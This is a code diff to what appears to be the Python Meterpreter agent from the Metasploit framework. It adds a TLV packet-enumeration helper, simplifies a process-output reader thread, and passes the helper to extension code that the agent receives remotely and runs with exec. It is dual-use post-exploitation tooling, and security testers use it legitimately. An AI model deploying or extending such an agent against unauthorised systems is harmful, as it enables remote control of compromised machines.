@@ -111,6 +111,24 @@ def packet_get_tlv(pkt, tlv_type):
 		offset += tlv[0]
 	return {}
 
+def packet_enum_tlvs(pkt, tlv_type = None):
+	offset = 0
+	while (offset < len(pkt)):
+		tlv = struct.unpack('>II', pkt[offset:offset+8])
+		if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
+			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
+			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
+				val = val.split('\x00', 1)[0]
+			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
+				val = struct.unpack('>I', val)[0]
+			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
+				val = bool(struct.unpack('b', val)[0])
+			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
+				pass
+			yield {'type':tlv[1], 'length':tlv[0], 'value':val}
+		offset += tlv[0]
+	raise StopIteration()
+
 def tlv_pack(*args):
 	if len(args) == 2:
 		tlv = {'type':args[0], 'value':args[1]}
@@ -140,15 +158,10 @@ class STDProcessBuffer(threading.Thread):
 		self.data_lock = threading.RLock()
 
 	def run(self):
-		while self.is_alive():
-			byte = self.std.read(1)
+		for byte in iter(lambda: self.std.read(1), ''):
 			self.data_lock.acquire()
 			self.data += byte
 			self.data_lock.release()
-		data = self.std.read()
-		self.data_lock.acquire()
-		self.data += data
-		self.data_lock.release()
 
 	def is_read_ready(self):
 		return len(self.data) != 0
@@ -271,7 +284,7 @@ class PythonMeterpreter(object):
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
 			return ERROR_FAILURE
 		preloadlib_methods = self.extension_functions.keys()
-		i = code.InteractiveInterpreter({'meterpreter':self, 'packet_get_tlv':packet_get_tlv, 'tlv_pack':tlv_pack, 'STDProcess':STDProcess})
+		i = code.InteractiveInterpreter({'meterpreter':self, 'packet_enum_tlvs':packet_enum_tlvs, 'packet_get_tlv':packet_get_tlv, 'tlv_pack':tlv_pack, 'STDProcess':STDProcess})
 		i.runcode(compile(data_tlv['value'], '', 'exec'))
 		postloadlib_methods = self.extension_functions.keys()
 		new_methods = filter(lambda x: x not in preloadlib_methods, postloadlib_methods)
